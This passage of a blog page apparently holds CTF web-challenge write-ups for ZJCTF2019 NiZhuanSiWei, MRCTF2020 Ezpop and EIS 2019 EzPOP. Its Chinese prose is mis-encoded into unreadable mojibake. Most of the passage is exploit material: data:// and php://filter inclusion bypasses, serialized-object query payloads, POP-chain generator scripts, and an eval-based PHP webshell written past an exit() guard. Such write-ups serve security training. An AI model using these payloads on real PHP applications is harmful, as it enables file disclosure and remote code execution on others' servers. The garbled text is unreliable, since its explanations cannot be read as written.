class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºæŸ¥çœ‹phpinfo</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703230203.png" alt=""></p><p>ç›´æ¥è®¿é—®d0g3_f1ag.phpæ²¡æœ‰å›æ˜¾ã€‚</p><h3 id="TODO-v2">TODO</h3><h2 id="ZJCTF2019-NiZhuanSiWei">[ZJCTF2019]NiZhuanSiWei</h2><h3 id="è€ƒç‚¹-v4">è€ƒç‚¹</h3><ul><li>ä»£ç å®¡è®¡</li><li>æ–‡ä»¶åŒ…å«</li><li>PHPååºåˆ—åŒ–</li></ul><h3 id="è§£é¢˜-v4">è§£é¢˜</h3><p>ç›´æ¥ç»™å‡ºæºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="file-get-contentsç»•è¿‡">file_get_contentsç»•è¿‡</h4><p>æœ‰ä¸¤ç§æ–¹å¼ç»•è¿‡ï¼š</p><ol><li>ä½¿ç”¨php://inputä¼ªåè®®ç»•è¿‡<br>â‘  å°†è¦GETçš„å‚æ•°?xxx=php://input<br>â‘¡ ç”¨postæ–¹æ³•ä¼ å…¥æƒ³è¦file_get_contents()å‡½æ•°è¿”å›çš„å€¼</li><li>ç”¨data://ä¼ªåè®®ç»•è¿‡<br>å°†urlæ”¹ä¸ºï¼š?xxx=data://text/plain;base64ï¼Œæƒ³è¦file_get_contents()å‡½æ•°è¿”å›çš„å€¼çš„base64ç¼–ç <br>æˆ–è€…å°†urlæ”¹ä¸ºï¼š?xxx=data:text/plain,(urlç¼–ç çš„å†…å®¹)</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure><h4 id="è¯»å–useless-php">è¯»å–useless.php</h4><p>é¢˜ç›®æœ‰ç¬¬äºŒä¸ªå‚æ•°fileï¼Œå¤§æ¦‚æ˜¯include()è¿™ä¸ªfileï¼Œé¢˜ç›®æç¤ºæˆ‘ä»¬è¦åŒ…å«useless.phpï¼ŒåŒæ—¶æœ‰ä¸€ä¸ªåˆ¤æ–­æ˜¯fileå‚æ•°ä¸èƒ½ä¼ å…¥flagï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸èƒ½ç›´æ¥åŒ…å«flag.phpã€‚</p><p>åˆ©ç”¨php://filteråè®®è¯»å–è¿™ä¸ªuseless.phpï¼Œæ„é€ payloadè¯»å–useless.phpï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure><p>useless.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;HAHAHAHAHA&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ååºåˆ—åŒ–">ååºåˆ—åŒ–</h4><p>useless.phpçš„é­”æœ¯æ–¹æ³•æ˜¯<code>__toString()</code>ï¼Œåˆšå¥½å¯ä»¥ä½¿ç”¨<code>echo $password</code>è§¦å‘è¿™ä¸ªé­”æœ¯æ–¹æ³•ã€‚</p><p>ç”Ÿæˆpayloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> Flag();</span><br><span class="line">$s = serialize($o);</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>ç»¼åˆèµ·æ¥çš„payloadå°±æ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="MRCTF2020-Ezpop">[MRCTF2020]Ezpop</h2><h3 id="è€ƒç‚¹-v5">è€ƒç‚¹</h3><ul><li>POPé“¾æ„é€ </li></ul><h3 id="è§£é¢˜-v5">è§£é¢˜</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $var=<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = <span class="keyword">new</span> Show();</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$m = <span class="keyword">new</span> Modifier();</span><br><span class="line">$t-&gt;p = $m;</span><br><span class="line">$s-&gt;source = $s;</span><br><span class="line">$s-&gt;str = $t;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($s));</span><br></pre></td></tr></table></figure><h2 id="EIS-2019-EzPOP">[EIS 2019]EzPOP</h2><h3 id="è€ƒç‚¹-v6">è€ƒç‚¹</h3><ul><li>POPé“¾æ„é€ </li><li>php://filter ç»•è¿‡exit()</li><li>base64ç¼–ç è§„åˆ™</li></ul><h3 id="è§£é¢˜-v6">è§£é¢˜</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$store, $key = <span class="string">&#x27;flysystem&#x27;</span>, $expire = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = $key;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = $store;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> $contents</span>) </span>&#123;</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span>(<span class="params">$expire</span>): <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> $name</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params">$data</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>) $data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $serialize = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params">$name, $value, $expire = <span class="literal">null</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">            $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line"></span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// åˆ›å»ºå¤±è´¥</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize($value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//æ•°æ®å‹ç¼©</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, $expire) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . $data;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;src&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_dir($dir))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure><p>é¢˜ç›®æç¤ºçš„å¾ˆæ˜æ˜¾ï¼Œéœ€è¦æ„é€ ä¸€ä¸ªPOPé“¾ï¼Œèƒ½åˆ©ç”¨çš„é­”æ³•å‡½æ•°åªæœ‰ <code>A::__destruct()</code>ï¼Œå¯èƒ½å¯ä»¥åˆ©ç”¨çš„æ•æ„Ÿå‡½æ•°ï¼šB ç±» <code>set()</code> ä¸­çš„ <code>file_put_contents()</code>ã€‚å…ˆåˆ†æä¸€ä¸‹ <code>file_put_contents()</code> å‡½æ•°æ˜¯å¦æ»¡è¶³åˆ©ç”¨æ¡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, $expire) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . $data;</span><br><span class="line">$result = file_put_contents($filename, $data);</span><br></pre></td></tr></table></figure><p>åœ¨ exit() ä»£ç åé¢æ‹¼æ¥ <code>$data</code> æ•°æ®ï¼Œç„¶åå†™å…¥æ–‡ä»¶ã€‚è¿™æ ·å°±ä¼šå¯¼è‡´æˆ‘ä»¬é€šè¿‡<code>$data</code>å†™å…¥çš„shlléƒ½ä¸ä¼šè¢«æ‰§è¡Œã€‚</p><p>exit()å‡½æ•°å¯ä»¥åˆ©ç”¨<code>base64_decode</code>ä»¥åŠ<code>php://filter</code>å¯ä»¥ç»•è¿‡ã€‚</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨</a></p></blockquote><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815093758.png" alt=""></p><p>è¿™é‡Œæ€è·¯æ˜¯<strong>åˆ©ç”¨ <code>php://filter</code> æä¾›çš„å„ç§å‡½æ•°å»é™¤ â€œæ­»äº¡exitâ€</strong>ã€‚</p><p>æ¥ä¸‹æ¥å¼€å§‹å¯»æ‰¾ POP é“¾</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815093927.png" alt=""></p><p>æ¥ä¸‹æ¥å›æº¯çœ‹<code>$filename</code>å’Œ``$data`æ˜¯æ€ä¹ˆæ¥çš„ï¼š</p><p><code>$filename</code>ï¼šå…ˆè°ƒç”¨<code>getCacheKey($name)</code>ï¼Œæ”¹æ–¹æ³•æ˜¯æ‰§è¡Œè¿æ¥å­—ç¬¦ä¸²çš„ä½œç”¨ï¼š<code>$this-&gt;option['prefix'].$name</code>æ„æˆfilenameã€‚</p><p><code>$data</code>ï¼šæ¥è‡ªäº<code> $this-&gt;serialize($value)</code>ï¼Œæ‰€ä»¥å†å…³æ³¨<code>$value</code>æ˜¯æ€ä¹ˆæ¥çš„ã€‚<code>$value</code>æ˜¯<code>A::getForStorage()</code>çš„è¿”å›å€¼ï¼š<code>json_encode([A::cleanContents(A::cache), A::complete]);</code>ã€‚<br><code>A::cleanContents(A::cache)</code>å®ç°äº†ä¸€ä¸ªè¿‡æ»¤çš„åŠŸèƒ½ï¼Œ<strong>A::completeæ›´å®¹æ˜“æ§åˆ¶ï¼Œç›´æ¥å†™ä¸ºshellcode</strong>ã€‚</p><p>å…¶ä¸­cleanContents():</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> $contents</span>) </span>&#123;</span><br><span class="line">    $cachedProperties = array_flip([</span><br><span class="line">        <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">            $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $contents;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°è¯•æœ¬åœ°è¿è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> $contents</span>) </span>&#123;</span><br><span class="line">    $cachedProperties = array_flip([</span><br><span class="line">        <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">            $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $contents;</span><br><span class="line">&#125;</span><br><span class="line">$cache=<span class="keyword">array</span>();</span><br><span class="line">$complete=<span class="string">&#x27;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> json_encode([cleanContents($cache), $complete]);</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[],&quot;&lt;?php @eval($_POST[\&quot;a\&quot;]);?&gt;&quot;]</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç›´æ¥completeå†™å…¥shellä¼šä½¿shellä¸­åŒå¼•å·è¢«è½¬ä¹‰äº†ï¼Œæ‰€ä»¥å¾—è€ƒè™‘ç”¨base64ç¼–ç ç»•è¿‡è½¬ä¹‰ï¼Œå†åœ¨ä¹‹åè§£ç ã€‚ç”±äºä¹‹åå¯ä»¥è®©<code>$this-&gt;options['serialize']=base64.decode</code>ï¼Œè¿™æ ·å’Œfilter://å°±å…±æœ‰ä¸¤å¤„è§£ç å¤„ç†ï¼Œæ‰€ä»¥å¯¹åº”è¿™é‡Œè€ƒè™‘ç¼–ç ä¸¤æ¬¡ã€‚</p><p>æœ€ç»ˆä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span 